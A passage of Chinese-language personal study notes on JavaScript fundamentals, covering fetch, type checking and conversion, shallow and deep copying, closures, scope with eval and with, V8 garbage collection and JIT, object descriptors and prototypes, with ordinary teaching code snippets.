fetchStart\n前一个页面卸载耗费的时间：unloadEventEnd - unloadEventStart\nonload回调函数的执行时间：loadEventEnd - loadEventStart\n用户等待页面完全可用时间（页面加载完成）：oadEventEnd - navigationStart\ncookie\ncookie默认是临时的，浏览器关闭进程就会自动销毁，并且cookie是纯文本\n通过document.cookie = \u0026ldquo;xxx\u0026quot;来修改cookie\ncookie存储大小限制在4kb\nFetch api允许在JavaScript发起http请求和响应，使用Promise\nfetch('https://api.github.com/')\r.then(response =\u0026gt; response.json())\r.then(data =\u0026gt; console.log(data))\r.catch(err =\u0026gt; console.log('Request Failed', err))\r可以看到fetch接收一个url参数，并且具备then和catch方法，并且response接收到数据是stream对象，并且将这个stream对象转换为json对象\nfetch只有当网络故障或者请求被阻止时才报错，因此不管是否请求成功（例如404或者502）\nresponse对象还有一些属性，例如response.ok（表示是否请求成功，http状态码在200-299的范围时），response.status（http状态码），response.url（请求的url，如果有跳转，那么该属性值为最终的请求地址），response.redirected（请求是否发送跳转），response.headers（请求头）等等\n例如： async function getData(url = \u0026ldquo;\u0026quot;,data={}){ const response = await fetch(url, { method: \u0026lsquo;GET\u0026rsquo;, headers: { \u0026ldquo;Content-type\u0026rdquo;: \u0026ldquo;application/x-www-form-urlencoded\u0026rdquo;, }, }) return response.json() } getData(\u0026lsquo;https://api.github.com/') .then(data =\u0026gt; { console.log(data) })\n基础类型存储在栈内存中，在引用或者拷贝时，创建一个完全相等的变量\n引用类型存储在堆内存中，存储的是内存地址，多个引用可以指向同一个地址（内存共享）（return会改变引用的地址）\n类型检测\ntypeof（不能用来检测null类型，null不是object类型，另外object类型除了function可以检测出来外，其他都是objet，因此typeof可以检测基础类型以及function，其他类型就不适合了））\ninstanceof（不能正确判断基础数据类型，但是可以判断引用类型）\n在不知道数据类型的情况下做数据类型判断，可以先用typeof abc !==\u0026lsquo;object\u0026rsquo; || abc !==null筛选出基础类型（null除外，如果是null直接返回null），如果是基础类型直接用typeof获取数据类型，如果不是再用instanceof判断引用类型\nObject.prototype.toString（该方法可以返回某值的数据类型，返回值类型是字符串，格式统一为[object 数据类型]），如果不想要object，只要后面的数据类型，只需要将返回值进行正则一下就是可以了（replace(/^[object(\\S+)]$/, \u0026lsquo;$1\u0026rsquo;)）\nfunction a(){\rconsole.log(\u0026quot;hallo\u0026quot;)\r}\rlet b = {\rname: \u0026quot;abc\u0026quot;,\rpass: \u0026quot;123\u0026quot;\r}\rlet c = [1,3,5,7,9]\rlet d = new a\rlet e = 'hallo word'\rconsole.log(typeof a) // function\rconsole.log(typeof b) // object\rconsole.log(typeof c) // object\rconsole.log(a instanceof Function) // true\rconsole.log(b instanceof Object) // true\rconsole.log(c instanceof Array) // true\rconsole.log(d instanceof a) // true\rconsole.log(e instanceof String) // false\rconsole.log(Object.prototype.toString.call(null)) // [object Null]\rconsole.log(Object.prototype.toString.call(e)) // [object String]\r数据类型转换（显式类型转换（强制类型转换）和隐式类型转换（自动类型转换））\n强制类型转换方法：Number()，Boolean()，String()，parselnt()，toString()，parseFloat()\nNumber()规则：如果值是布尔值，true转1，false转0。如果是整数，返回自身。如果是null，返回0。如果是undefined，返回NaN。如果是字符串，包含整数，转换为十进制，包含浮点格式，转换浮点数，空字符串为0，其他情况均为NaN。如果是Symbol，抛出错误，如果是对象，调用该方法，如果返回值为NaN，调用其对象的valueOf()方法\nBoolean()规则：undefined，null，0，+0，-0，\u0026rsquo;\u0026rsquo;，false，NaN均为false，其他情况都为true\n隐式类型转换\n==：如果类型相同，不转换类型，如果有个值为null或者undefined，只有当另一个是null或者undefined，才返回true，否则都为false，如果有个值为Symbol类型，返回false。如果俩个值为Sting和Number类型，Sting类型的那个将转换为number类型，如果有值的类型为boolean，则转换为number，如果有值类型为object，另一个值为number，string或者symbol时，先将object转换为原始类型再判断\n传说中的console.log(abc==1 \u0026amp;\u0026amp; abc==2 \u0026amp;\u0026amp; abc==3)，就是利用了==的隐式类型转换规则，这个abc实质上是个对象，==隐式类型转换如果是对象，会先尝试将其转换为基础类型，如果不行会调用其valueOf()方法，而且这个valueOf()方法就是定义其返回值的，并且通过this获取当前被调用的返回值\nlet abc = {\rvalue: 0,\rvalueOf: function(){\rthis.value++\rreturn this.value\r}\r}\rconsole.log(abc==1 \u0026amp;\u0026amp; abc==2 \u0026amp;\u0026amp; abc==3)\r+：加号被用于数值相加和字符串拼接，如果两边值都是字符串，则直接拼接字符串。如果有个是字符串，另一个是unll，Boolean类型或者undefined时，调用toString()方法（该方法的返回值为字符串类型的），然后再进行字符串拼接。如果有个是数值，另一个是number类型，则进行加法处理，如果另一个是null，undefined，boolean则转换为number类型再加法处理。如果一个是number类型，另一个是string类型，则将number类型那个转换为string类型，然后再字符串拼接\nobject隐式转换规则：如果有Symbol.toPrimitive()方法，则优先调用该返回再返回，如果没有该方法，并且object不能转为基础类型，则自动调用valueOf()方法，如果该方法返回了基础类型，则返回，如果还是不行则调有toString()方法（实质上就是返回其字符串），如果能转换为基础类型，则返回，如果还是没有返回基础类型，则抛出错误\n浅拷贝：如果是基础类型，拷贝的是基础类型的值，如果是引用类型，拷贝的是内存中的地址，如果改变该引用类型的值，会影响使用了该内存地址的全部引用类型的值\nObject.assign()方法可以实现浅拷贝（不拷贝继承属性，不拷贝不可枚举属性，但是可以拷贝Symbol类型的对象）\n对象的不可枚举属性通过enumerable: false设置\nlet hallo = {}\rlet hi = {\rname: 'admin',\rpass: 'abc123'\r}\rObject.assign(hallo,hi)\rconsole.log(hallo)\rhi.name = 'xiaochen'\rconsole.log(hallo)\rconsole.log(hi)\r扩展运算符(\u0026hellip;abc)\nlet hi = {\rname: 'admin',\rpass: 'abc123',\rdata: {\rid: 1,\rtext: \u0026quot;hallo word\u0026quot;\r}\r}\rlet hallo = { ...hi }\rconsole.log(hallo)\rconsole.log(hi)\rhi.name = 'user'\rconsole.log(hallo)\rconsole.log(hi)\rhi.data.id = 10\rconsole.log(hallo)\r扩展运算符，只有单层对象属性或者数组时，是深拷贝，修改其属性，不会影响到其他使用该对象的属性，如果是一层以上的数据时，会变成浅拷贝，只能影响一层以上的数据，在一层的数据不受影响\nconcat()方法（可用于浅拷贝数组）\nlet hallo = [2,4,5,6,7,8,9,12]\rlet hi = hallo.concat()\rconsole.log(hallo)\rconsole.log(hi)\rhi[0] = 66\rconsole.log(hallo)\rconsole.log(hi)\rslice()方法（可用于浅拷贝数组）\nlet hallo = [{data: 66},2,4,5,6,7,8,9]\rlet hi = hallo.slice()\rconsole.log(hallo)\rconsole.log(hi)\rhi[0].data = 123\rconsole.log(hallo)\rconsole.log(hi)\rObject.assign()（将所有可枚举属性的值从原有对象拷贝到目标对象中）\nlet obj = {\rname: 'xiaochen',\rpass: 'abc123',\rdata: {\rid: 1,\rtext: \u0026quot;hallo word\u0026quot;\r}\r}\rlet obja = Object.assign({},obj)\rconsole.log(obja)\r该方法缺陷就是只能拷贝可枚举的属性， 好处就是Symbol类型的属性可以被拷贝\n手写浅拷贝（通过传入目标对象参数，得到一个经过浅拷贝的对象）\nlet obj = {\rname: 'xiaochen',\rpass: 'abc123',\rdata: {\rid: 1,\rtext: \u0026quot;hallo word\u0026quot;\r}\r}\rlet objfu = (obj) =\u0026gt;{\rif(typeof obj ==='object' \u0026amp;\u0026amp; obj !== null){\r// 使用typeof判断obj参数是否是对象，并且还不是null\rlet obja = Array.isArray(obj)?[]:{} // 使用Array.isArray()判断obj是否是数组（是数组返回true，否则返回false），这里是一个三元表达式（为true时返回[]，为false时返回{}）\rfor(let i in obj){ // in关键字遍历obj的属性（或者数组）\rif(obj.hasOwnProperty(i)){ // hasOwnProperty方法可以判断该对象是否存在某个属性，存在则返回true，否则返回false\robja[i] = obj[i] // 判断存在后，将obj的属性拷贝到obja的属性中（浅拷贝），属性值和属性一一对应\r}\r}\rreturn obja\r}else{\rreturn obj\r}\r}\rconsole.log(objfu(obj))\rlet hhh = objfu(obj)\rhhh.data.id =66\rconsole.log(objfu(obj))\rconsole.log(hhh)\r深拷贝：创建一个新对象，然后复制原有的对象的基本类型值，其完全是在堆内存中创建新的内存地址，不受原有的对象的改动影响\nJSON.stringify()，通过生成一个json字符串，json字符串再转为新的对象\nlet obj = {\rname: 'xiaochen',\rpass: 'abc123',\rdata: {\rid: 1,\rtext: \u0026quot;hallo word\u0026quot;\r}\r}\rlet str = JSON.stringify(obj)\rlet obja = JSON.parse(str)\rconsole.log(obja)\robj.data.id = 66\rconsole.log(obja)\rconsole.log(obj)\r注意：如果对象中的值有函数，undefined，symbol类型，使用JSON.stringify()会导致json字符串中的这个键值对会消失，不能拷贝不可枚举属性，Data类型变成字符串，不能拷贝对象原型链，拷贝RegExp类型时会变成空对象，不能拷贝正则表达式，另外对象的属性值含有NaN，Infinity（Infinity表示无穷大），-Infinity（-Infinity表示负无穷大）时，JSON序列化后变成null，不能拷贝对象的循环应用（对象成环 ，obj[key] = obj）\n手写递归深拷贝\nlet obj = {\rname: 'xiaochen',\rpass: 'abc123',\rdata: {\rid: 1,\rtext: \u0026quot;hallo word\u0026quot;\r}\r}\rfunction objfu(obj) {\rlet obja = {}\rfor(let i in obj){\rif(typeof obj[i] ==='object'){\robja[i] = objfu(obj[i])\r}else{\robja[i] = obj[i]\r}\r}\rreturn obja\r}\rlet hhh = objfu(obj)\robj.data.id = 123\rconsole.log(hhh)\rconsole.log(obj)\r这个手写递归，依然不能复制不可枚举属性和symbol类型，而且只能对一些普通对象有效，像函数之类就没有效果了\n原型链继承的缺点是原型链是内存共享的，一个发生改变，其他继承同一个的，都会发生改变\n构造函数继承的缺点是只能继承父类的方法，属性，实例，不能继承原型的实例和方法\nnew关键词的作用：执行一个构造函数，并且返回一个实例对象，根据构造函数来确定是否可以接受参数的传递\nnew执行后必然返回一个对象，这个对象可以是实例对象，也可以是构造函数return返回的指定对象\n手写new\nfunction _new(funs,...args){\rif(typeof funs !=='function'){\rthrow \u0026quot;no function\u0026quot;\r}\rlet obj = new Object()\robj.__proto__ = Object.create(funs.prototype)\rlet res = funs.apply(obj,...args)\rlet isObj = typeof res === 'object' \u0026amp;\u0026amp; typeof res !== null\rlet isFuns = typeof res === 'function'\rreturn isObj || isFuns ? res:obj\r} 闭包：利用作用域链特性，访问局部变量\nIIFE（立即执行函数）本身创建了闭包，保留了全局作用域和当前作用域\n什么是闭包？例如：\nfunction abc(){\rlet a = 666\rfunction xyz(){\rconsole.log(a)\r}\rreturn xyz\r}\rlet haha = abc()\rhaha()\r可以看到函数abc的返回值是xyz函数，变量haha被赋值abc函数，并且调用了xyz函数，神奇的获取到变量a的值\n关键点：xyz可以访问abc的作用域。在执行完毕abc函数，作用域并没有被销毁，而在垃圾回收中，只有被使用才不会被回收，在这里abc函数的作用域被xyz函数所使用，而且haha被调用时，执行的就是xyz函数，得到abc函数的整个定义时的词法作用域\n简单的说就是，利用作用域链（这个特指函数作用域，函数作用域具备遮蔽性），内部作用域可以获取外部作用域的变量，只有当内部作用域拥有访问整个外部作用域时，内部作用域在某个时刻被调用了，自然可以访问到外部的定义时的词法作用域，利用这个特性，内部作用域只要能在定义时词法作用域之外的地方调用，就可以实现闭包，从而访问外部定义时的词法作用域\n除了通过返回值外，还可以在定义时调用外部函数，外部函数再调用具备外部词法作用域访问能力的内部函数，也可以访问到这个定义时词法作用域，例如：\nfunction abc(){\rlet a = 666\rfunction xyz(){\rconsole.log(a)\r}\rhaha(xyz)\r}\rfunction haha(funs){\rfuns()\r}\rabc()\r闭包会导致内存溢出\n数组\nArray数组构造器\nlet arr = Array(3)\n当Array构造器的参数长度为0或者大于等于2时，传入的参数按顺序变成新数组的元素（参数长度为0，返回空数组）\n当Array构造器存在1个数值参数时，这个参数最大不能超过2的32次方\nArray.of()方法可以将参数按照顺序变成数组的元素，然后返回这个新数组，这个参数可以是数值（而且不会被用来创建指定长度的数组）\nArray.from()方法有3个参数，类似于数组的对象，加工函数，this作用域（加工函数中this的指向）\nlet arr = {\r0:'abc',\r1: 'xyz',\r2: 'hallo word',\rlength: 3\r}\rlet abc = Array.from(arr,function(value,index){\rconsole.log(value,index,this)\rreturn value.repeat(3)\r},arr)\rconsole.log(abc)\rArray.isArray方法可以判断是否是数组\n类数组的对象（和数组类似，但是没有数组的方法）：函数的arguments，HTMLCollection，NodeList\n类数组转真数组：\nlet abc = {\r0: 'hhh',\r1: 'bbb',\r2: 'abc',\rlength: 3\r}\rconsole.log(abc)\rlet a = Array.from(abc)\rconsole.log(a)\rlet b = Array.prototype.concat.apply([], abc)\rconsole.log(b)\rlet c = Array.prototype.slice.call(abc)\rconsole.log(c)\r数组扁平化（将一个多维数组转换为只有一层的数组）\n通过递归实现，只要元素还是个数组，就进行递归操作\n通过reduce函数迭代\n通过扩展运算符实现\n通过toString().split(\u0026rsquo;,\u0026rsquo;)实现\n通过flat()方法实现\n例如：\nlet arr = [2,[3,5,6,10,[1,2,3],56,88],44,66]\rfunction arrData(arr){\rreturn arr.flat(Infinity)\r}\rconsole.log(arrData(arr)) // [2, 3, 5, 6, 10, 1, 2, 3, 56, 88, 44, 66]\r通过JSON.stringify()和正则实现（先将数组转换为json字符串，然后通过正则(/([|])/g）过滤掉[]，得到的字符串再通过JSON.parst()转换回\nv8引擎垃圾回收\n基础类型使用栈内存（按值访问），可以使用操作系统进行处理，而引用类型的堆内存需要经常变化（使用引用内存地址访问），大小不固定，需要使用垃圾回收机制来处理\nSting和Number和Boolean和null和undefined和Symbol类型的变量将存储于栈内存，其他类型都存储于堆内存中\nv8引擎的堆内存分为2类，新生代内存和老生代内存\n在64位操作系统中，新生代内存空间为32MB\n新生代中的变量经过一次Scavenge算法回收后，就可以被放入老生代内存中\nScavenge算法将新生代内存分为from-space和to-space两个区域\n新生代内存中变量先存储在from-space区，存活的变量将转移到to-space区域，然后将那些在from-space区中不活跃的变量清除释放，执行完毕，再to-space和from-space互换\n老生代内存垃圾回收机制，Mark-Sweep（标记清除）和Mark-Compact（标记整理）\nMark-Sweep（标记清除）：先遍历堆上所有对象，并且打上标记，在代码执行完成后，对使用过的变量进行标记取消，而且存在标记的变量就是没有使用过的变量，将这些变量进行垃圾回收\nMark-Compact（标记整理）：（解决标记清除机制的内存碎片化的影响）将内存空间往一端靠拢，直接清除边界外的内存\n内存泄露：已经分配堆内存地址的对象长时间没有释放或者无法释放，造成内存长期占用，导致应用响应变慢或者崩溃的情况\n内存泄露优化：减少全局变量，使用完定时器后及时清除定时器，避免死循环\n将一个强引用类型赋值为null，并不会直接导致其被GC，而是解除其引用，方便下次GC能回收它\n解决因闭包导致的内存泄露，在不使用一个闭包函数时，应该手动将其引用变量设置为null，解除引用\nV8引擎执行JavaScript程序的阶段（因为v8使用了java虚拟机，c++编译器的技术，使JavaScript执行存在编译器）\nParse阶段：将JavaScript代码转换为AST（抽象语法树）\nIgnition阶段：解释器将AST转换为字节码，然后解析执行字节码，并且提供编译所需要的信息\nTurboFan阶段：编译器使用Ignition阶段的编译信息，将字节码转换为可执行的机器码\nOrinoco阶段：垃圾回收阶段，将不使用的内存空间进行垃圾回收\n生成AST有两个阶段，词法分析和语法分析\n词法分析阶段会将JavaScript代码解析拆成不能再分的词法单元（token），直接忽略空格\n语法分析阶段将词法单元转换为由元素逐级嵌套而成的语法结构树，这个树叫抽象语法树\nJavaScript借用方法（重用其他对象的方法和函数，无需从该对象继承）\n例如一个类数组（类数组并没有数组的方法），借用数组的方法，通过call()，apply()和bind()方法实现\nlet arrObj = {\r0:'abc',\r1: 'xyz',\r2: 'hallo word',\rlength: 3\r}\rlet arr1 = Array.prototype.join.bind(arrObj,',')\rlet arr2 = Array.prototype.pop.call(arrObj)\rlet arr3 = Array.prototype.push.apply(arrObj,['hhh'])\rconsole.log(arr1())\rconsole.log(arr2)\rconsole.log(arr3)\rconsole.log(arrObj)\r从Array.prototype可以看到这些方法是在类型的原型上定义的，当然其他自定义方法也是可以通过对象.方法的方式借用\n通过字面量（Literals）实现\n在JavaScript中，使用字面量可以代表值。它们是固定值，不是变量，就是在脚本中按字面给出的。\nlet arrObj = {\r0:'abc',\r1: 'xyz',\r2: 'hallo word',\rlength: 3\r}\rlet arr1 = [].join.bind(arrObj,',')\rconsole.log(arr1())\r[]表示Array.prototype，还有\u0026rsquo;\u0026lsquo;表示stringObject\ncreateDocumentFragment \u0026amp;\u0026amp; requestAnimationFrame渲染大量\ndocument.createDocumentFragment()会返回一个DocumentFragment对象，这个对象是DOM节点，但又不是主DOM树的一部分，其是用于创建文档片段，文档片段在内存中，将元素插入文档片段不会导致回流，而且文档片段是直接附加在主DOM树上\nwindow.requestAnimationFrame()，该方法会在浏览器的重绘之前执行一个回调函数\nDocumentFragment对象是一个没有父对象的文档对象，DocumentFragment和document区别就是DocumentFragment不是真实DOM树的一部分，但是它可以挂载在真实DOM树上\n实现渲染10000条div数据\nlet count = 0\rfunction callback(){\rconst nums = 10000 // 一共插入10000条\rconst num = 100 // 一次插入100条\rlet loop = Math.ceil(nums / num) // 计算需要执行多少次\rconst app = document.querySelector(\u0026quot;#app\u0026quot;)\rconst data = 'hallo word'\rconst vmDOM = document.createDocumentFragment()\rfor (let i = 0; i \u0026lt; num; i++) {\rconst div = document.createElement(\u0026quot;div\u0026quot;)\rdiv.innerHTML = data\rvmDOM.appendChild(div)\r}\rapp.appendChild(vmDOM)\rcount++\rif (count \u0026lt; loop) {\rwindow.requestAnimationFrame(callback)\r}\r}\rcallback()\rdocument.createDocumentFragment()和直接操作DOM，测试结果说明并不是每操作一次dom都会导致渲染，而且是将短时间的dom操作合并在一起，然后统一渲染，操作10000次DOM，并不会触发10000次渲染，而是在一定的时间内的多次操作合并成一次操作，并且在一定的时间内执行该操作，最后渲染，这得益于现代浏览器的优化\nPromise/A+规范\nPromise有很多规范，ES6使用的就是Promise A+规范\nPromise A+规范：\nPromise是具备then方法的对象或者函数\nPromise需要存在3个状态：等待态（pending），成功态（fulfilled），失败态（rejected）\n并且Promise初始状态为等待（pending），在等待态（pending）状态时可以转为成功态（fulfilled）或者失败态（rejected）其中之一\n当处于成功态（fulfilled）时，不能改变其状态，还需具备一个不可改变的返回值（value）\n当处于失败态（rejected）时，也不能改变其状态，还需具备一个不可改变的返回原因（reason）\n需要提供then()方法来返回成功的结果或者失败的原因（传入2个可选参数，onFulfilled和onRejected，如果是函数的话，会在Promise执行完毕后调用，如果不是函数的话会忽略，onFulfilled和onRejected都只能被调用一次）\n当处于成功态（fulfilled）之后，执行onFulfilled，返回value，当处于失败态（rejected）之后，执行onRejected，返回reason\nthen()可在同一个Promise被多次调用，then()必须返回一个promise对象\n手写Promise\nJavaScript引擎（例如v8）可以让JavaScript符合了一些编译语言的特点（词法分析/分词，语法分析/解析，编译转换）（虽然不是提前编译执行）\n词法分析/分词(Tokenizing/Lexing)：将程序源代码分成一个个的词法单元（token），而词法分析就是将源代码转换为词法单元，具体通过符号表来确定是变量还是函数什么的\n语法分析/解析：将词法单元流转换为抽象语法树（AST, Abstract Syntax Tree）,这个抽象树表示了整个程序的语法结构\n注意：并不是词法分析器获取完全部的词法单元后在再进行语法分析的，而是先获取一个词法单元后直接进行语法分析\n编译转换：将AST语法树转换为可执行的机器码（引擎可根据语法树一边编译一边执行）\n一边编译一边执行有个缺点，当某段代码频繁执行时（例如函数）就会导致重复编译（提前编译的可以在执行前就是处理好），因此添加了一种叫JIT（Just-in-time，即时编译）\nJIT在JavaScript引擎中添加了一个监视器，可观察运行的代码，并且记录每段代码的运行次数和变量的类型\n当某段代码执行了多次，监视器就会给这段代码标识为Warm，如果是执行很多次的话，会标识为Hot\n当某段代码被标识为Warm后，JIT将其发送给基线编译器（Baseline compiler）编译，并且将编译结果存储起来，并且以行号，变量类型作为索引，当执行了符合索引的代码时，直接执行之前编译的代码，不需要重复编译\n当某段代码被标识为Hot后，JIT将其发送给优化编译器（Optimizing compiler）编译优化，是通过假设（根据概率模型）变量类型（当存在多个假设时（如果只有一个假设时，直接执行对应的编译结果），会在执行前进行类型检查，来证明假设，如果假设不成立，会导致反优化（将使用编译器或者基数编译器处理（假设多次失败实质比直接编译还慢，因此浏览器做出了限制，当出现多次优化失败时，会放弃处理这个）））\n作用域\n作用域是一套可以根据名称来查找变量的规则（每个作用域负责管理自己地方的变量），当多重嵌套作用域时，会形成作用域链，在当前作用域中查找不到，会向上一级查找，一直查找到全局作用域，如果还是没有找到就是报错\nLHS查询和RHS查询\nLHS查询是获取变量的实质内存（赋值操作，例如let a = 123），RHS查询是获取变量的值（例如console.log(a)，这个就是RHS查询）\n注意：函数传递参数也是LHS查询，只不过变量变成函数的参数而已，而且当作用域链找不到LHS查询的目标时，作用域会创建一个同名的变量到全局作用域中（隐式创建变量，前提是要在非严格模式中）\n在作用域链中，当前作用域的RHS查询或者LHS查询任务完不成，是可以到上一级作用域中完成的\n词法作用域\n作用域有两种，词法作用域和动态作用域，在JavaScript中的作用域就是词法作用域，虽然JavaScript没有动态作用域，但是可以用this来实现相似的效果\n词法作用域就是在词法分析/分词阶段的作用域，一般情况下词法作用域在定义后是不会改变的（有个例外是，欺骗词法作用域，例如利用eval或者with欺骗）\n函数的词法作用域是由函数被定义时所处的位置决定，不会被函数如何调用，在哪调用而影响\n由于作用域查找会在找到第一个目标时会停止的特性，在多重嵌套作用域环境下，其他和目标同名的会被遮蔽找不到，除了全局对象外（全局作用域下的变量会自动变成全局对象的属性（例如window.abc）,可以通过查找全局对象属性来访问到被遮蔽的变量），其他被遮蔽的无论如何都访问不了\n欺骗词法作用域\neval()允许接收一个字符串作为其参数，并且执行，例如\nfunction abc(str,b){\reval(str)\rconsole.log(a,b)\r}\rvar a = 123\rabc(\u0026quot;var a = 666\u0026quot;,100) // 666 100\r这里利用eval()传递并且执行了\u0026quot;var a = 666\u0026quot;到abc()函数中，改变了该函数的词法作用域，同时遮蔽了全局作用域中的a变量，这个前提是在非严格模式中，因为在严格模式中eval()在运行时会拥有自己的作用域，导致无法修改其所在的作用域\nwith()可以扩展语句的作用域链（注意：在ES5严格模式中，with被完全禁用了）\nlet abc ={\ra: 123,\rb: 666\r}\rwith(abc){\ra = 666\rb = 123\r}\rwith()可以将对象处理成词法作用域，在with内部中对象的属性也会变成这个词法作用域的词法标识符，从而改变原来的词法作用域，例如：\nlet abc ={\ra: 123,\rb: 666\r}\rfunction xyz(obj){\rwith(obj){\ra = 666\rb = 123\r}\r}\rxyz(abc)\rconsole.log(abc.a,abc.b)\r函数作用域（函数会为其创建一个它私有的作用域）\n在函数中定义的变量将成为其词法作用域中的标识符，无法在外部作用域中获取，在多重嵌套作用域中，外部作用域定义的变量，可以在内部作用域访问，但是外部作用域无法访问内部作用域\n函数作用域可以用于隐藏自身不影响外部，因此也可以避免污染外部环境（命名冲突）\nIIFE（立即执行函数表达式）\n由于正常的函数名也会污染外部环境，因此可使用IIFE解决，当不需要函数名时，这玩意很有用（就算有函数名也不会污染外部）\n有两种编写方式，分别是(function abc(){})()和(function abc(){}())\n(function abc( funs ) {\rlet xyz = {\ra: 123\r}\rfuns(xyz)\r})(function funs(xyz) {\rlet a = 666\rconsole.log(a)\rconsole.log(xyz.a)\r})\r块作用域\n在let出现之前，可以使用try/catch创建块作用域，其声明的变量只能在catch语句块中使用，例如：\ntry{\rthrow undefined // 手动制造异常\r}catch(a){\ra = 123\rconsole.log(a)\r}\rconsole.log(a) // a is not defined\rlet关键字可以将变量隐式绑定到其所在的块作用域中（{\u0026hellip;}内部），只有其作用域内部可以访问，在外部访问会报错，使用let定义的变量是属于一个全新的作用域，而不是当前的函数作用域或者全局作用域，除let关键字外，还有const关键字也可以，只不过const定义的是常量，在定义后不能修改（修改导致报错）\n对象\n对象可通过new Object()定义，也可以通过键值对来定义\nlet obj = new Object()\robj.key = \u0026quot;hallo\u0026quot;\rlet obj1 = { key: \u0026quot;hallo\u0026quot;}\r注意：null不是对象，因为JavaScript会将二进制前三位为0的变量判断为object类型，而null的二进制表示全为0，因此使用typeof判断值为null的变量的类型，会返回object\n000开头是对象，1开头是整数，010是浮点数，100是字符串，110是布尔\n注意：基础类型并不是对象，例如\u0026quot;hallo word\u0026quot;是字符串字面量，并不能直接修改值或者访问属性，但是JavaScript会将字符串字面量自动转换为string对象，但是这并不代表基础类型就是对象，数值字面量也会被转换为number类型\n对象是引用类型，这表示其真实的值存储中内存中，而对象内部存储的不过是指针引入，指向存储了该值的内存\n数组对象，数组内部存储的位置是索引（整数）\n注意：给数组添加属性，不要使用纯数字的属性名，因为当使用纯数字的属性名，JavaScript会将其认为是索引，从而认为其是添加一个新值，而不是添加一个属性\n复制对象（深拷贝，浅拷贝）\n对象属性描述符（es5之后属性拥有了属性描述符，例如writable（是否可以修改属性的值），enumerable（可枚举）和 configurable（可设置））\n创建属性时属性描述符默认使用默认值\nlet Obj = {}\rObject.defineProperty( Obj, \u0026quot;key\u0026quot;, { value: \u0026quot;hallo word\u0026quot;, writable: true, // 可修改属性值\rconfigurable: true, // 可重新通过Object.defineProperty设置属性描述符\renumerable: true // 可被属性枚举，例如for in语句，如果为false，那么该属性不会出现在属性枚举中，例如in操作枚举\r});\r因此可通过writable，configurable设置为false，来创建常量属性\n设置对象不再可扩展新属性，可使用Object.preventExtensions()\nlet obj1 = { key: \u0026quot;hallo\u0026quot;}\rObject.preventExtensions(obj1)\robj1.nums = 666\rconsole.log(obj.nums) // undefined\r设置对象不再可扩展新属性并且不能修改现有属性的配置或者删除属性（可以修改属性值），可以使用Object.seal()\nlet obj1 = { key: \u0026quot;hallo\u0026quot;}\rObject.seal(obj1)\robj1.nums = 666\rconsole.log(obj.nums) // undefined\r当然也可以在Object.seal()基础上，禁止修改属性值，Object.freeze()\nlet obj1 = { key: \u0026quot;hallo\u0026quot;}\rObject.freeze(obj1)\robj1.key = \u0026quot;hahaha\u0026quot; // TypeError\r注意：在访问属性时，会在该对象中查找是否存在名字相同的属性，如果存在就返回该属性的值，如果没有找到就会触发原型链机制\n在设置属性时，会检查是否存在描述符，检查是否设置（writable），如果不可设置，在非严格模式下静默失败，在严格模式中抛出typeerror异常错误\ngetter和setter\n定义一个可获取属性值的方法（getter），定义一个可设置属性值的方法（setter）\nlet obj1 = { key: \u0026quot;hallo\u0026quot;,\rget a(){\rreturn this.key\r},\rset b(abc){\rthis.key = abc\r}\r}\rconsole.log(obj1.a) // hallo\robj.b = \u0026quot;hahaha\u0026quot;\rconsole.log(obj1.a) // hahaha\r正确地判断属性是否存在，属性值可设置为undefined，并不一定是属性不存在导致返回的undefined,解决这种情况有2种方法，一个是通过in操作符（可通过原型链查找），另一个是通过Object.hasOwnProperty()，Object.hasOwnProperty()只检查该属性是否存在该对象中，例如：\nlet obj1 = {\rkey: 123\r}\r(\u0026quot;key\u0026quot; in obj1)\robj1.hasOwnProperty(\u0026quot;key\u0026quot;)\r注意：hasOwnProperty方法是object对象的内置方法，如果没有链接到object原型链上的对象，是不能使用该方法的，只能通过借用方法来使用该方法，例如：Object.prototype.hasOwnProperty. call(obj1,\u0026ldquo;key\u0026rdquo;)\n检查该属性是否可枚举\nobj1.propertyIsEnumerable(\u0026quot;key\u0026quot;) // 返回布尔值，检查该属性是否直接存在于对象中（并不在原型链中，并且可枚举）\rObject.keys(obj1) // 返回数组，该数组的元素为该对象全部可枚举属性\rObject.getOwnPropertyNames(obj1) // 返回数组，该数组的元素为该对象属性，不管是否可枚举，并不会返回原型链的属性，只返回该对象中直接包含的属性\r遍历数组（forEach()，every()，some()）\nforEach()遍历数组中全部值，并且忽略回调函数的返回值\nevery()运行到回调函数返回false\nsome()运行到回调函数返回true\nfor of()语句会向被遍历对象请求迭代器对象，然后通过迭代器对象的next()来遍历全部返回值\n类，继承，实例化\n类简单来说就是蓝图，而实例化就是根据蓝图建造出房子\n继承是指一个子类继承了一个父类的特性（属性以及方法都被继承，当然也可以重写属性和方法），父类和子类不存在直接关系，而且父类和子类的构造函数可通过prototype联系到\n方法的多态性（取决于在哪个类的实例使用它）\njs并不支持多态，多态（或者理解为重载）实质上就是重写父类的方法，然后通过不同的类实例化，引用不同类的实例下的同名方法\n在继承链中不同级别（子类，父类，祖先类）的同一个方法名可以被多次定义，调用的是哪个方法取决于是通过哪个类实例化出来的\n原型\n当获取一个对象的属性时，但是这个属性并不直接存在于该对象中时，就会访问对象的prototype链中，例如：\nlet obj = {\ra: \u0026quot;hallo word\u0026quot;,\r};\rlet obj1 = Object.create(obj)\rconsole.log(obj1.a)\r上面例子中通过Object.create()创建来一个obj1.prototype可以连接到obj中的对象，哪怕obj1.a并没有在该对象中定义该属性，还是可以通过obj1.prototype获取到obj.a的属性值\n原型链查找的终点是Object.prototype，如果还是没有找到就返回undefined\n如果原型链底层中的对象存在原型链高层的相同属性名时，将会屏蔽高层的属性，因为原型链只获取最近的一个属性\nPWA，Progressive Web App（渐变式web应用），pwa技术可以将web应用具备接近原生应用的特性和用户体验，无需额外安装，支持离线缓存，消息推送等功能\npwa可通过Service Worker来进行下载，打开pwa应用后，\nService Worker：服务工作线程，独立于主线程，常驻内存，代理网络请求，依赖于HTTPS通信\nmanifest.json：让web应用具备app的效果，例如logo，启动页面\n高阶函数（惰性函数/柯里化函数/compose组合函数）\nCompose（组合函数）\n组合函数顾名思义，就是将多个函数组合在一起，当一个函数的参数是另一个函数的返回值时，导致复杂的嵌套关系例如“funs(a(b(c)))”，而Compose可以做到调用函数的扁平化，例如：\nfunction compose(...funs){\rreturn function(...abc){\rif(funs.length === 0){\rreturn funs\r}\rif(funs.length === 1){\rreturn funs[0]\r}\rreturn funs.reduce(function(a,b){\rconsole.log(a)\rconsole.log(b)\rif(typeof a === \u0026quot;function\u0026quot;){\rreturn b(a(...abc))\r}else{\rreturn b(a)\r}\r})\r}\r}\rfunction a(x){\rreturn x + 100\r}\rfunction b(x){\rreturn x * 